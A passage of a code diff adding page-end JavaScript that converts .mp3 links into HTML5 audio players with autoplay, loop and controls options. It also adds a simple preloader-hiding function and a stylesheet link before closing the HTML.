+            if (str[0].lastIndexOf('.mp3', str[0].length - 4) === str[0].length - 4 && str1.length == 0) {
+                if(str[1].indexOf('autoplay=1') !== -1) var autoplay=1; else var autoplay=0;
+                if(str[1].indexOf('loop=1') !== -1) var loop=1; else var loop=0;
+                if(str[1].indexOf('controls=0') !== -1) var controls=0; else var controls=1;
+                var newInnerHTML = '<audio';
+                if(autoplay==1) newInnerHTML += ' autoplay';
+                if(loop==1) newInnerHTML += ' loop';
+                if(controls==1) newInnerHTML += ' controls';
+                newInnerHTML += '><source src="'+str[0]+'" type="audio/mpeg">Your browser does not support the audio element.</audio>';
+                p[i].innerHTML = newInnerHTML;
+            }
+        }
+    }
+}
+mp3_embed();
+</script>
+
+
+<!-- preloder script -->
+<script>
+    var preloader = document.getElementById("loader");
+    function loaderFunc(){
+      preloader.style.display = 'none';
+    };
+</script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<!-- end -->
+
+</body>
+</html>
